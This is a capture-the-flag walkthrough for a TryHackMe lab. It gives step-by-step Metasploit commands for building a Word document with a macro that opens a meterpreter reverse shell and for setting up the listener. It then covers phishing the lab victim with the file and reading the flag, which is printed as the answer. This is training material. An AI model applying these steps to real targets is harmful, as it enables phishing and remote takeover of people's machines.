**Advent of Cyber 2024 [Day 10] Writeup with Answers | TryHackMe Walkthrough**
**Intro to Macros** Macros in Microsoft Office are automation tools that allow users to automate repetitive tasks, such as formatting, calculations, or converting numbers to words. While they can save time in everyday tasks, they can also be exploited for malicious purposes. Cyber attackers can hijack these macros to execute malicious code on a victim's machine.

In the context of this task, the goal is to exploit a macro vulnerability in MS Word to gain access to the target system, with the ultimate goal of retrieving a flag from the administrator's desktop.

### **Task 16 — Phishing: He had a brain full of macros, and had shells in his soul.**

#### **Objective:**
To retrieve the flag value inside the `flag.txt` file located on the Administrator's desktop.
### **Steps:**
#### **I. Payload Creation**
1. Open a terminal and start the Metasploit console by typing:
    `msfconsole`
    
2. Once inside Metasploit, create a payload with the following commands:
    `set payload windows/meterpreter/reverse_tcp use exploit/multi/fileformat/office_word_macro set LHOST <Your IP Address> set LPORT 8888 exploit`
    
    - `LHOST` should be set to your machine's IP address.
    - `LPORT` is the port that the reverse connection will use (in this case, 8888).
3. After running the exploit, the MS Word document with the malicious macro payload is created. Move the document to a different location on your machine.
    

#### **II. Creating Listener**

1. Open another terminal window and set up the listener to handle the reverse connection by typing:
    `use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST <Your IP Address> set LPORT 8888 exploit`
    
2. The listener should now be running, waiting for a reverse connection from the victim's machine.
    

#### **III. Sending Payload and Exploiting**

1. Open a browser and paste your TryHackMe machine IP in a new tab. Log in with the given credentials.
    
2. Create a new email addressed to `marta@socmas.thm`. Attach the malicious Word document (the one with the macro payload).
    
3. Wait for the victim to open the document. Once they do, the reverse connection should be established, and you’ll gain control of the target machine.
    
4. After gaining access, use the following commands in the Meterpreter session to navigate to the administrator's desktop and read the flag:
    `cat c:/users/Administrator/Desktop/flag.txt`
    
    Alternatively:
    `cd c:/users/Administrator/Desktop cat flag.txt`
    

### **Answer:**
`THM{PHISHING_CHRISTMAS}`

---

This walkthrough highlights the process of exploiting a macro vulnerability to execute a payload and gain access to a system.